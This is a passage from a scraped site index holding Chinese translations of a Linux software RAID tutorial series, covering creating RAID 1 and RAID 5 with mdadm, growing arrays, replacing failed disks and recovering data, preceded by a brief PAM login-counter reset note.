用于显示循讯息 PAM 模块与参数 待补充: | type | control flag | PAM模块与模块参数 | | ---- | ------------ | ---------- | | | | | | | | | | | | | Linux重置root(user) ssh重置root(user)登陆失败计数器: pam_tally2 --user=root --reset # 重置登陆计数器 passwd root # 重置密码","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-PAM-module.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-PAM-module.html"},{"title":"用两块磁盘创建 RAID 1 (镜像)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 评论: https://linux.cn/portal.php?mod=comment&id=6093&idtype=aid RAID 镜像 意味着相同数据的完整克隆（或镜像），分别写入到两个磁盘中。 创建 RAID 1 至少需要两个磁盘，而且仅用于读取性能或者可靠性要比数据存储容量更重要的场合。 创建镜像是为了防止因硬盘故障导致数据丢失。 镜像中的每个磁盘包含数据的完整副本。 当一个磁盘发生故障时，相同的数据可以从其它正常磁盘中读取。 而后，可以从正在运行的计算机中直接更换发生故障的磁盘，无需任何中断。 RAID 1 的特点 镜像具有良好的性能。 磁盘利用率为50％。也就是说，如果我们有两个磁盘每个500GB，总共是1TB，但在镜像中它只会显示500GB。 在镜像如果一个磁盘发生故障不会有数据丢失，因为两个磁盘中的内容相同。 读取性能会比写入性能更好。 要求 创建 RAID 1 至少要有两个磁盘，你也可以添加更多的磁盘，磁盘数需为2，4，6，8等偶数。 要添加更多的磁盘，你的系统必须有 RAID 物理适配器（硬件卡）。 这里，我们使用软件 RAID 不是硬件 RAID，如果你的系统有一个内置的物理硬件 RAID 卡， 你可以从它的功能界面或使用 Ctrl + I 键来访问它。 RAID 的级别和概念 原文: < https://linux.cn/article-6085-1.html >`_ 本地: RAID 的级别和概念 服务器配置: - 操作系统 : CentOS 6.5 FinalIP - 地址 : 192.168.0.226 - 主机名 : rd1.tecmintlocal.com - 磁盘 1 [20GB] : /dev/sdb - 磁盘 2 [20GB] : /dev/sdc 本文将指导你在 Linux 平台上使用 mdadm （用于创建和管理 RAID ）一步步的建立一个软件 RAID 1 （镜像）。 同样的做法也适用于如 RedHat，CentOS，Fedora 等 Linux 发行版。 第1步：安装所需软件并且检查磁盘 正如我前面所说，在 Linux 中我们需要使用 mdadm 软件来创建和管理 RAID。 所以，让我们用 yum 或 apt-get 的软件包管理工具在 Linux 上安装 mdadm 软件包: yum install mdadm [在 RedHat 系统]### apt-get install mdadm [在 Debain 系统] 一旦安装好 mdadm 包，我们需要使用下面的命令来检查磁盘是否已经配置好: mdadm -E /dev/sd[b-c] 第2步：为 RAID 创建分区 正如我提到的，我们使用最少的两个分区 /dev/sdb 和 /dev/sdc 来创建 RAID 1。 我们首先使用 fdisk 命令来创建这两个分区并更改其类型为 raid: fdisk /dev/sdb 按照下面的说明 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 按两次回车键默认将整个容量分配给它。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 修改分区类型。 键入 fd 设置为 Linux 的 RAID 类型，然后按 Enter 确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 在创建\"/dev/sdb\"分区后，接下来按照同样的方法创建分区 /dev/sdc: fdisk /dev/sdc 一旦这两个分区创建成功后，使用相同的命令来检查 sdb 和 sdc 分区并确认 RAID 分区的类型如上图所示: mdadm -E /dev/sd[b-c] 注解 正如你在上图所看到的，在 sdb1 和 sdc1 中没有任何对 RAID 的定义，这就是我们没有检测到超级块的原因。 第3步：创建 RAID 1 设备 接下来使用以下命令来创建一个名为 /dev/md0 的\"RAID 1\"设备并验证它: mdadm --create /dev/md0 --level=mirror --raid-devices=2 /dev/sd[b-c]1### cat /proc/mdstat 接下来使用如下命令来检查 RAID 设备类型和 RAID 阵列: mdadm -E /dev/sd[b-c]1### mdadm --detail /dev/md0 检查 RAID 设备阵列 从上图中，人们很容易理解，RAID 1 已经创建好了， 使用了 /dev/sdb1 和 /dev/sdc1 分区，你也可以看到状态为 resyncing（重新同步中）。 第4步：在 RAID 设备上创建文件系统 给 md0 上创建 ext4 文件系统: mkfs.ext4 /dev/md0 创建 RAID 设备文件系统 接下来，挂载新创建的文件系统到\"/mnt/raid1\"，并创建一些文件，验证在挂载点的数据: mkdir /mnt/raid1 mount /dev/md0 /mnt/raid1/ touch /mnt/raid1/tecmint.txt echo \"tecmint raid setups\" > /mnt/raid1/tecmint.txt 挂载 RAID 设备 为了在系统重新启动自动挂载 RAID 1，需要在 fstab 文件中添加条目。 打开 /etc/fstab 文件并添加以下行: /dev/md0 /mnt/raid1 ext4 defaults 0 0 自动挂载 Raid 设备 运行 mount -av ，检查 fstab 中的条目是否有错误: mount -av 检查 fstab 中的错误 接下来，使用下面的命令保存 RAID 的配置到文件\"mdadm.conf\"中: mdadm --detail --scan --verbose >> /etc/mdadm.conf 保存 Raid 的配置 上述配置文件在系统重启时会读取并加载 RAID 设备。 第5步：在磁盘故障后检查数据 我们的主要目的是，即使在任何磁盘故障或死机时必须保证数据是可用的。 让我们来看看，当任何一个磁盘不可用时会发生什么: mdadm --detail /dev/md0 验证 RAID 设备 在上面的图片中，我们可以看到在 RAID 中有2个设备是可用的， 并且 Active Devices 是2。 现在让我们看看，当一个磁盘拔出（移除 sdc 磁盘）或损坏后会发生什么: ls -l /dev | grep sd### mdadm --detail /dev/md0 测试 RAID 设备 现在，在上面的图片中你可以看到，一个磁盘不见了。 我从虚拟机上删除了一个磁盘。此时让我们来检查我们宝贵的数据: cd /mnt/raid1/### cat tecmint.txt 验证 RAID 数据 你可以看到我们的数据仍然可用。 由此，我们可以了解 RAID 1（镜像）的优势。 在接下来的文章中，我们将看到如何设置一个 RAID 5 条带化分布式奇偶校验。 希望这可以帮助你了解 RAID 1（镜像）是如何工作的。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-1-with-two-disks-(mirror).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-1-with-two-disks-(mirror).html"},{"title":"创建 RAID 5 (条带化与分布式奇偶校验)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 在 RAID 5 中，数据条带化后存储在分布式奇偶校验的多个磁盘上。 分布式奇偶校验的条带化意味着它将奇偶校验信息和条带化数据分布在多个磁盘上，这样会有很好的数据冗余。 在 Linux 中配置 RAID 5 对于此 RAID 级别它至少应该有三个或更多个磁盘。 RAID 5 通常被用于大规模生产环境中，以花费更多的成本来提供更好的数据冗余性能。 什么是奇偶校验 奇偶校验是在数据存储中检测错误最简单的常见方式。 奇偶校验信息存储在每个磁盘中，比如说，我们有4个磁盘，其中相当于一个磁盘大小的空间被分割去存储所有磁盘的奇偶校验信息。 如果任何一个磁盘出现故障，我们可以通过更换故障磁盘后，从奇偶校验信息重建得到原来的数据。 RAID 5 的优点和缺点 提供更好的性能。 支持冗余和容错。 支持热备份。 将用掉一个磁盘的容量存储奇偶校验信息。 单个磁盘发生故障后不会丢失数据。我们可以更换故障硬盘后从奇偶校验信息中重建数据。 适合于面向事务处理的环境，读操作会更快。 由于奇偶校验占用资源，写操作会慢一些。 重建需要很长的时间。 要求 创建 RAID 5 最少需要3个磁盘，你也可以添加更多的磁盘， 前提是你要有多端口的专用硬件 RAID 控制器。在这里，我们使用\"mdadm\"包来创建软件 RAID。 mdadm 是一个允许我们在 Linux 下配置和管理 RAID 设备的包。 默认情况下没有 RAID 的配置文件，我们在创建和配置 RAID 后必须将配置文件保存在一个单独的文件 mdadm.conf 中。 在进一步学习之前，我建议你通过下面的文章去了解 Linux 中 RAID 的基础知识 原文: 介绍 RAID 的级别和概念 使用 mdadm 工具创建软件 RAID 0 （条带化） 用两块磁盘创建 RAID 1（镜像） 我的服务器设置: 操作系统 : CentOS 6.5 FinalIP 地址 : 192.168.0.227 主机名 : rd5.tecmintlocal.com 磁盘 1 [20GB] : /dev/sdb 磁盘 2 [20GB] : /dev/sdc 磁盘 3 [20GB] : /dev/sdd 这是9篇系列教程的第4部分， 在这里我们要在 Linux 系统或服务器上使用三个20GB（名为/dev/sdb, /dev/sdc 和 /dev/sdd） 的磁盘建立带有分布式奇偶校验的软件 RAID 5。 第1步：安装 mdadm 并检验磁盘 使用 CentOS 6.5 Final 版本来创建 RAID 设置，但同样的做法也适用于其他 Linux 发行版: lsb_release -a ifconfig | grep inet CentOS 6.5 摘要 如果你按照我们的 RAID 系列去配置的，我们假设你已经安装了\"mdadm\"包，如果没有，根据你的 Linux 发行版使用下面的命令安装: yum install mdadm # [在 RedHat 系统] apt-get install mdadm # [在 Debain 系统] \"mdadm\"包安装后，先使用`fdisk`命令列出我们在系统上增加的三个20GB的硬盘: fdisk -l | grep sd 安装 mdadm 工具 现在该检查这三个磁盘是否存在 RAID 块，使用下面的命令来检查: mdadm -E /dev/sd[b-d] mdadm --examine /dev/sdb /dev/sdc /dev/sdd # 或 检查 Raid 磁盘 注解 上面的图片说明，没有检测到任何超级块。 所以，这三个磁盘中没有定义 RAID。让我们现在开始创建一个吧！ 第2步：为磁盘创建 RAID 分区 首先，在创建 RAID 前磁盘（/dev/sdb, /dev/sdc 和 /dev/sdd）必须有分区， 因此，在进行下一步之前，先使用 fdisk 命令进行分区: fdisk /dev/sdb fdisk /dev/sdc fdisk /dev/sdd 创建 /dev/sdb 分区, 请按照下面的说明在 /dev/sdb 硬盘上创建分区。 按 n 创建新的分区。 然后按 P 选择主分区。选择主分区是因为还没有定义过分区。 接下来选择分区号为1。默认就是1。 这里是选择柱面大小，我们没必要选择指定的大小，因为我们需要为 RAID 使用整个分区，所以只需按两次 Enter 键默认将整个容量分配给它。 然后，按 P 来打印创建好的分区。 改变分区类型，按 L 可以列出所有可用的类型。 按 t 修改分区类型。 这里使用 fd 设置为 RAID 的类型。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 创建 sdb 分区 注解 我们仍要按照上面的步骤来创建 sdc 和 sdd 的分区。 创建 /dev/sdc 分区, 现在，通过下面的截图给出创建 sdc 和 sdd 磁盘分区的方法，或者你可以按照上面的步骤: fdisk /dev/sdc 创建 sdc 分区 创建 /dev/sdd 分区: fdisk /dev/sdd 创建 sdd 分区 创建分区后，检查三个磁盘 sdb, sdc, sdd 的变化: mdadm --examine /dev/sdb /dev/sdc /dev/sdd mdadm -E /dev/sd[b-c] 检查磁盘变化 注解 在上面的图片中，磁盘的类型是 fd。 现在在新创建的分区检查 RAID 块。如果没有检测到超级块，我们就能够继续下一步，在这些磁盘中创建一个新的 RAID 5 配置。 在分区中检查 RAID 第3步：创建 md 设备 md0 现在使用所有新创建的分区(sdb1, sdc1 和 sdd1) 创建一个 RAID 设备\"md0\"（即 /dev/md0），使用以下命令: mdadm --create /dev/md0 --level=5 --raid-devices=3 /dev/sdb1 /dev/sdc1 /dev/sdd1 ### mdadm -C /dev/md0 -l=5 -n=3 /dev/sd[b-d]1 ### 或 创建 RAID 设备后，检查并确认 RAID，从 mdstat 中输出中可以看到包括的设备的 RAID 级别: cat /proc/mdstat 验证 Raid 设备 如果你想监视当前的创建过程，你可以使用 watch 命令， 将 cat /proc/mdstat 传递给它，它会在屏幕上显示且每隔1秒刷新一次: watch -n1 cat /proc/mdstat 监控 RAID 5 构建过程 Raid 5 过程概要 创建 RAID 后，使用以下命令验证 RAID 设备: mdadm -E /dev/sd[b-d]1 验证 Raid 级别 注解 因为它显示三个磁盘的信息，上述命令的输出会有点长。 接下来，验证 RAID 阵列，假定包含 RAID 的设备正在运行并已经开始了重新同步: mdadm --detail /dev/md0 验证 RAID 阵列 第4步：为 md0 创建文件系统 在挂载前为\"md0\"设备创建 ext4 文件系统: mkfs.ext4 /dev/md0 创建 md0 文件系统 现在，在 /mnt 下创建目录 raid5， 然后挂载文件系统到 /mnt/raid5/ 下，并检查挂载点下的文件，你会看到 lost+found 目录: mkdir /mnt/raid5 mount /dev/md0 /mnt/raid5/ ls -l /mnt/raid5/ 在挂载点 /mnt/raid5 下创建几个文件，并在其中一个文件中添加一些内容然后去验证: touch /mnt/raid5/raid5_tecmint_{1..5} ls -l /mnt/raid5/ echo \"tecmint raid setups\" > /mnt/raid5/raid5_tecmint_1 cat /mnt/raid5/raid5_tecmint_1 cat /proc/mdstat 挂载 RAID 设备 我们需要在 fstab 中添加条目，否则系统重启后将不会显示我们的挂载点。 编辑 fstab 文件添加条目，在文件尾追加以下行。挂载点会根据你环境的不同而不同: vim /etc/fstab/dev/md0 /mnt/raid5 ext4 defaults 0 0 自动挂载 RAID 5 接下来，运行 mount -av 命令检查 fstab 条目中是否有错误: mount -av 检查 Fstab 错误 第5步：保存 Raid 5 的配置 在前面章节已经说过，默认情况下 RAID 没有配置文件。 我们必须手动保存。如果此步中没有跟随不属于 md0 的 RAID 设备，它会是一些其他随机数字。 所以，我们必须要在系统重新启动之前保存配置。 如果配置保存它在系统重新启动时会被加载到内核中然后 RAID 也将被加载: mdadm --detail --scan --verbose >> /etc/mdadm.conf 保存 RAID 5 配置 注意：保存配置将保持 md0 设备的 RAID 级别稳定不变。 第6步：添加备用磁盘 备用磁盘有什么用？它是非常有用的，如果我们有一个备用磁盘， 当我们阵列中的任何一个磁盘发生故障后，这个备用磁盘会进入激活重建过程，并从其他磁盘上同步数据，这样就有了冗余。 更多关于添加备用磁盘和检查 RAID 5 容错的指令，请阅读下面文章中的第6步和第7步。 在 RAID 5 中添加备用磁盘","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-5-(strip--oriented-and-distributed-strange-puppet-verification).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-5-(strip--oriented-and-distributed-strange-puppet-verification).html"},{"title":"在 RAID 中扩展现有的 RAID 阵列和删除故障的磁盘","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 评论: https://linux.cn/portal.php?mod=comment&id=6123&idtype=aid 每个新手都会对阵列（array）这个词所代表的意思产生疑惑。 阵列只是磁盘的一个集合。 换句话说，我们可以称阵列为一个集合（set）或一组（group）。 就像一组鸡蛋中包含6个一样。同样 RAID 阵列中包含着多个磁盘， 可能是2，4，6，8，12，16等，希望你现在知道了什么是阵列。 在这里，我们将看到如何扩展现有的阵列或 RAID 组。 例如，如果我们在阵列中使用2个磁盘形成一个 raid 1 集合， 在某些情况，如果该组中需要更多的空间，就可以使用 mdadm -grow 命令来扩展阵列大小， 只需要将一个磁盘加入到现有的阵列中即可。 在说完扩展（添加磁盘到现有的阵列中）后，我们将看看如何从阵列中删除故障的磁盘。 扩展 RAID 阵列和删除故障的磁盘 假设磁盘中的一个有问题了需要删除该磁盘，但我们需要在删除磁盘前添加一个备用磁盘来扩展该镜像， 因为我们需要保存我们的数据。当磁盘发生故障时我们需要从阵列中删除它，这是这个主题中我们将要学习到的。 扩展 RAID 的特性 我们可以增加（扩展）任意 RAID 集合的大小。 我们可以在使用新磁盘扩展 RAID 阵列后删除故障的磁盘。 我们可以扩展 RAID 阵列而无需停机。 要求 为了扩展一个RAID阵列，我们需要一个已有的 RAID 组（阵列）。 我们需要额外的磁盘来扩展阵列。 在这里，我们使用一块磁盘来扩展现有的阵列。 在我们了解扩展和恢复阵列前，我们必须了解有关 RAID 级别和设置的基本知识。点击下面的链接了解这些。 原文 介绍 RAID 的级别和概念 使用 mdadm 工具创建软件 RAID 0 （条带化） 服务器设置: 操作系统 : CentOS 6.5 Final IP地址 : 192.168.0.230 主机名 : grow.tecmintlocal.com 2 块现有磁盘 : 1 GB 1 块额外磁盘 : 1 GB 在这里，我们已有一个 RAID ，有2块磁盘，每个大小为1GB， 我们现在再增加一个磁盘到我们现有的 RAID 阵列中，其大小为1GB。 扩展现有的 RAID 阵列 在扩展阵列前，首先使用下面的命令列出现有的 RAID 阵列: mdadm --detail /dev/md0 检查现有的 RAID 阵列 注解 以上输出显示，已经有了两个磁盘在 RAID 阵列中，级别为 RAID 1。现在我们增加一个磁盘到现有的阵列里。 现在让我们添加新的磁盘\"sdd\"，并使用 fdisk 命令来创建分区: fdisk /dev/sdd 请使用以下步骤为 /dev/sdd 创建一个新的分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按回车确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 为 sdd 创建新的分区 一旦新的 sdd 分区创建完成后，你可以使用下面的命令验证它: ls -l /dev/ | grep sd 确认 sdd 分区 接下来，在添加到阵列前先检查磁盘是否有 RAID 分区: mdadm --examine /dev/sdd1 在 sdd 分区中检查 RAID 注解 以上输出显示，该盘有没有发现 super-blocks，意味着我们可以将新的磁盘添加到现有阵列。 要添加新的分区 /dev/sdd1 到现有的阵列 md0，请使用以下命令: mdadm --manage /dev/md0 --add /dev/sdd1 添加磁盘到 RAID 阵列 一旦新的磁盘被添加后，在我们的阵列中检查新添加的磁盘: mdadm --detail /dev/md0 确认将新磁盘添加到 RAID 中 注解 在上面的输出，你可以看到磁盘已经被添加作为备用的。在这里，我们的阵列中已经有了2个磁盘，但我们期待阵列中有3个磁盘，因此我们需要扩展阵列。 要扩展阵列，我们需要使用下面的命令: mdadm --grow --raid-devices=3 /dev/md0 扩展 Raid 阵列 现在我们可以看到第三块磁盘(sdd1)已被添加到阵列中，在第三块磁盘被添加后，它将从另外两块磁盘上同步数据: mdadm --detail /dev/md0 确认 Raid 阵列 注解 对于大容量磁盘会需要几个小时来同步数据。在这里，我们使用的是1GB的虚拟磁盘，所以它非常快在几秒钟内便会完成。 从阵列中删除磁盘 在数据被从其他两个磁盘同步到新磁盘 sdd1 后，现在三个磁盘中的数据已经相同了（镜像）。 正如我前面所说的，假定一个磁盘出问题了需要被删除。所以，现在假设磁盘 sdc1 出问题了，需要从现有阵列中删除。 在删除磁盘前我们要将其标记为失效，然后我们才可以将其删除: mdadm --fail /dev/md0 /dev/sdc1### mdadm --detail /dev/md0 在 RAID 阵列中模拟磁盘故障* 从上面的输出中，我们清楚地看到，磁盘在下面被标记为 faulty。 即使它是 faulty 的，我们仍然可以看到 raid 设备有3个，1个损坏了，状态是 degraded。 现在我们要从阵列中删除 faulty 的磁盘，raid 设备将像之前一样继续有2个设备: mdadm --remove /dev/md0 /dev/sdc1 在 Raid 阵列中删除磁盘 一旦故障的磁盘被删除，然后我们只能使用2个磁盘来扩展 raid 阵列了: mdadm --grow --raid-devices=2 /dev/md0### mdadm --detail /dev/md0 在 RAID 阵列扩展磁盘 从上面的输出中可以看到，我们的阵列中仅有2台设备。 如果你需要再次扩展阵列，按照如上所述的同样步骤进行。 如果你需要添加一个磁盘作为备用，将其标记为 spare，因此，如果磁盘出现故障时，它会自动顶上去并重建数据。 结论 在这篇文章中，我们已经看到了如何扩展现有的 RAID 集合，以及如何在重新同步已有磁盘的数据后从一个阵列中删除故障磁盘。 所有这些步骤都可以不用停机来完成。在数据同步期间，系统用户，文件和应用程序不会受到任何影响。 在接下来的文章我将告诉你如何管理 RAID，敬请关注更新，不要忘了写评论。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Extend-the-existing-RAID-array-and-delete-the-fault-disk-in-RAID.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Extend-the-existing-RAID-array-and-delete-the-fault-disk-in-RAID.html"},{"title":"当软件 RAID 故障时如何恢复和重建数据","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6448&idtype=aid >`_ 在阅读过 RAID 系列 前面的文章后你已经对 RAID 比较熟悉了。 回顾前面几个软件 RAID 的配置，我们对每一个都做了详细的解释，使用哪一个取决与你的具体情况。 在本文中，我们将讨论当一个磁盘发生故障时如何重建软件 RAID 阵列并且不会丢失数据。 为方便起见，我们仅考虑RAID 1 的配置 - 但其方法和概念适用于所有情况。 RAID 测试方案 在进一步讨论之前，请确保你已经配置好了 RAID 1 阵列， 可以按照本系列第3部分提供的方法: 在 Linux 中如何创建 RAID 1（镜像） 在目前的情况下，仅有的变化是： 使用不同版本 CentOS（v7），而不是前面文章中的（v6.5）。 磁盘容量发生改变， /dev/sdb 和 /dev/sdc（各8GB）。 此外，如果 SELinux 设置为 enforcing 模式，你需要将相应的标签添加到挂载 RAID 设备的目录中。 否则，当你试图挂载时，你会碰到这样的警告信息： 启用 SELinux 时 RAID 挂载错误 通过以下命令来解决: restorecon -R /mnt/raid1 配置 RAID 监控 存储设备损坏的原因很多（尽管固态硬盘大大减少了这种情况发生的可能性），但不管是什么原因， 可以肯定问题随时可能发生，你需要准备好替换发生故障的部分，并确保数据的可用性和完整性。 首先建议是。虽然你可以查看 /proc/mdstat 来检查 RAID 的状态，但有一个更好的和节省时间的方法， 使用监控 + 扫描模式运行 mdadm，它将警报通过电子邮件发送到一个预定义的收件人。 要这样设置，在 /etc/mdadm.conf 添加以下行: MAILADDR user@<domain or localhost> 我自己的设置如下: MAILADDR gacanepa@localhost 监控 RAID 并使用电子邮件进行报警 要让 mdadm 运行在监控 + 扫描模式中，以 root 用户添加以下 crontab 条目: @reboot /sbin/mdadm --monitor --scan --oneshot 默认情况下，mdadm 每隔60秒会检查 RAID 阵列，如果发现问题将发出警报。 你可以通过添加 --delay 选项到crontab 条目上面，后面跟上秒数，来修改默认行为（例如， --delay 1800意味着30分钟）。 最后，确保你已经安装了一个邮件用户代理（MUA）， 如 mutt 或 mailx . 否则，你将不会收到任何警报。 在一分钟内，我们就会看到 mdadm 发送的警报。 模拟和更换发生故障的 RAID 存储设备 为了给 RAID 阵列中的存储设备模拟一个故障，我们将使用 --manage 和 --set-faulty 选项，如下所示: mdadm --manage --set-faulty /dev/md0 /dev/sdc1 这将导致 /dev/sdc1 被标记为 faulty，我们可以在 /proc/mdstat 看到： 在 RAID 存储设备上模拟问题 更重要的是，让我们看看是不是收到了同样的警报邮件: RAID 设备故障时发送邮件警报 在这种情况下，你需要从软件 RAID 阵列中删除该设备: mdadm /dev/md0 --remove /dev/sdc1 然后，你可以直接从机器中取出，并将其使用备用设备来取代（/dev/sdd 中类型为 fd 的分区是以前创建的）: mdadm --manage /dev/md0 --add /dev/sdd1 幸运的是，该系统会使用我们刚才添加的磁盘自动重建阵列。 我们可以通过标记 /dev/sdb1 为 faulty 来进行测试，从阵列中取出后，并确认 tecmint.txt 文件仍然在 /mnt/raid1 是可访问的: mdadm --detail /dev/md0 mount | grep raid1 ls -l /mnt/raid1 | grep tecmint cat /mnt/raid1/tecmint.txt 确认 RAID 重建 上面图片清楚的显示，添加 /dev/sdd1 到阵列中来替代 /dev/sdc1，数据的重建是系统自动完成的，不需要干预。 虽然要求不是很严格，有一个备用设备是个好主意，这样更换故障的设备就可以在瞬间完成了。 要做到这一点，先让我们重新添加 /dev/sdb1 和 /dev/sdc1: mdadm --manage /dev/md0 --add /dev/sdb1 mdadm --manage /dev/md0 --add /dev/sdc1 取代故障的 Raid 设备 从冗余丢失中恢复数据 如前所述，当一个磁盘发生故障时， mdadm 将自动重建数据。 但是，如果阵列中的2个磁盘都故障时会发生什么？让我们来模拟这种情况， 通过标记 /dev/sdb1 和 /dev/sdd1 为 faulty: umount /mnt/raid1 mdadm --manage --set-faulty /dev/md0 /dev/sdb1 mdadm --stop /dev/md0 mdadm --manage --set-faulty /dev/md0 /dev/sdd1 此时尝试以同样的方式重新创建阵列就（或使用 --assume-clean 选项）可能会导致数据丢失，因此不到万不得已不要使用。 让我们试着从 /dev/sdb1 恢复数据， 例如，在一个类似的磁盘分区（/dev/sde1 - 注意，这需要你执行前在/dev/sde 上创建一个 fd 类型的分区）上使用 ddrescue : ddrescue -r 2 /dev/sdb1 /dev/sde1 恢复 Raid 阵列 请注意，到现在为止，我们还没有触及 /dev/sdb 和 /dev/sdd，它们的分区是 RAID 阵列的一部分。 现在，让我们使用 /dev/sde1 和 /dev/sdf1 来重建阵列: mdadm --create /dev/md0 --level=mirror --raid-devices=2 /dev/sd[e-f]1 请注意，在真实的情况下，你需要使用与原来的阵列中相同的设备名称， 即设备失效后替换的磁盘的名称应该是 /dev/sdb1 和 /dev/sdc1。 在本文中，我选择了使用额外的设备来重新创建全新的磁盘阵列，是为了避免与原来的故障磁盘混淆。 当被问及是否继续写入阵列时，键入 Y，然后按 Enter。阵列被启动，你也可以查看它的进展: watch -n 1 cat /proc/mdstat 当这个过程完成后，你就应该能够访问 RAID 的数据： 确认 Raid 数据 总结 在本文中，我们回顾了从 RAID 故障和冗余丢失中恢复数据。 但是，你要记住，这种技术是一种存储解决方案，不能取代备份。 本文中介绍的方法适用于所有 RAID 中，其中的概念我将在本系列的最后一篇（RAID 管理）中涵盖它。 如果你对本文有任何疑问，随时给我们以评论的形式说明。我们期待倾听阁下的心声！","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-recover-and-rebuild-data-when-the-software-RAID-failure.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-recover-and-rebuild-data-when-the-software-RAID-failure.html"},{"title":"如何使用 Mdadm 工具管理软件 RAID","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6463&idtype=aid >`_ 无论你以前有没有使用 RAID 阵列的经验， 以及是否完成了 此 RAID 系列 的所有教程， 一旦你在 Linux 中熟悉了 mdadm --manage 命令的使用，管理软件 RAID 将不是很复杂的任务。 在本教程中，我们会再介绍此工具提供的功能，这样当你需要它，就可以派上用场。 RAID 测试方案 在本系列的最后一篇文章中，我们将使用一个简单的 RAID 1（镜像）阵列， 它由两个 8GB 的磁盘（/dev/sdb 和 /dev/sdc）和一个备用设备（/dev/sdd）来演示， 但在此使用的方法也适用于其他类型的配置。也就是说，放心去用吧，把这个页面添加到浏览器的书签，然后让我们开始吧。 了解 mdadm 的选项和使用方法 幸运的是，mdadm 有一个内建的 --help 参数来对每个主要的选项提供说明文档。 因此，让我们开始输入: mdadm --manage --help 就会使我们看到 mdadm --manage 能够执行哪些任务： 使用 mdadm 工具来管理 RAID 正如我们在上面的图片看到，管理一个 RAID 阵列可以在任意时间执行以下任务： （重新）将设备添加到阵列中 把设备标记为故障 从阵列中删除故障设备 使用备用设备更换故障设备 先创建部分阵列 停止阵列 标记阵列为 ro（只读）或 rw（读写） 使用 mdadm 工具管理 RAID 设备 需要注意的是，如果用户忽略 --manage 选项，mdadm 默认使用管理模式。请记住这一点，以避免出现最坏的情况。 上图中的高亮文本显示了管理 RAID 的基本语法: mdadm --manage RAID options devices 让我们来演示几个例子。 例1：为 RAID 阵列添加设备 你通常会添加新设备来更换故障的设备，或者使用空闲的分区以便在出现故障时能及时替换: mdadm --manage /dev/md0 --add /dev/sdd1 添加设备到 Raid 阵列 例2：把一个 RAID 设备标记为故障并从阵列中移除 在从逻辑阵列中删除该设备前，这是强制性的步骤， 然后才能从机器中取出它 - 注意顺序（如果弄错了这些步骤，最终可能会造成实际设备的损害）: mdadm --manage /dev/md0 --fail /dev/sdb1 请注意在前面的例子中，知道如何添加备用设备来自动更换出现故障的磁盘。 在此之后， 恢复和重建 raid 数据 就开始了： 恢复和重建 raid 数据 一旦设备已被手动标记为故障，你就可以安全地从阵列中删除它: mdadm --manage /dev/md0 --remove /dev/sdb1 例3：重新添加设备，来替代阵列中已经移除的设备 到现在为止，我们有一个工作的 RAID 1 阵列， 它包含了2个活动的设备：/dev/sdc1 和 /dev/sdd1。 现在让我们试试重新添加 /dev/sdb1 到/dev/md0: mdadm --manage /dev/md0 --re-add /dev/sdb1 我们会碰到一个错误: mdadm: --re-add for /dev/sdb1 to /dev/md0 is not possible 因为阵列中的磁盘已经达到了最大的数量。 因此，我们有两个选择: a）将 /dev/sdb1 添加为备用的，如例1； b）从阵列中删除 /dev/sdd1 然后重新添加 /dev/sdb1。 我们选择选项 b），先停止阵列然后重新启动: mdadm --stop /dev/md0### mdadm --assemble /dev/md0 /dev/sdb1 /dev/sdc1 如果上面的命令不能成功添加 /dev/sdb1 到阵列中，使用例1中的命令来完成。 mdadm 能检测到新添加的设备并将其作为备用设备，当添加完成后它会开始重建数据， 它也被认为是 RAID 中的活动设备： 重建 Raid 的状态 例4：使用特定磁盘更换 RAID 设备 在阵列中使用备用磁盘更换磁盘很简单: mdadm --manage /dev/md0 --replace /dev/sdb1 --with /dev/sdd1 更换 Raid 设备 这会导致 --replace 指定的设备被标记为故障，而 --with 指定的设备添加到 RAID 中来替代它： 检查 Raid 重建状态 例5：标记 RAID 阵列为 ro 或 rw 创建阵列后，你必须在它上面创建一个文件系统并将其挂载到一个目录下才能使用它。 你可能不知道，RAID 也可以被设置为 ro，使其只读；或者设置为 rw，就可以同时写入了。 要标记该设备为 ro，首先需要将其卸载: umount /mnt/raid1### mdadm --manage /dev/md0 --readonly### mount /mnt/raid1### touch /mnt/raid1/test1 在 RAID 阵列上设置权限 要配置阵列允许写入操作需要使用 --readwrite 选项。请注意，在设置 rw 标志前，你需要先卸载设备并停止它: umount /mnt/raid1### mdadm --manage /dev/md0 --stop### mdadm --assemble /dev/md0 /dev/sdc1 /dev/sdd1### mdadm --manage /dev/md0 --readwrite### touch /mnt/raid1/test2 配置 Raid 允许读写操作 总结 在本系列中，我们已经解释了如何建立一个在企业环境中使用的软件 RAID 阵列。 如果你按照这些文章所提供的例子进行配置，在 Linux 中你会充分领会到软件 RAID 的价值。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-use-MDADM-tool-management-software-RAID.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-How-to-use-MDADM-tool-management-software-RAID.html"},{"title":"安装 RAID 6 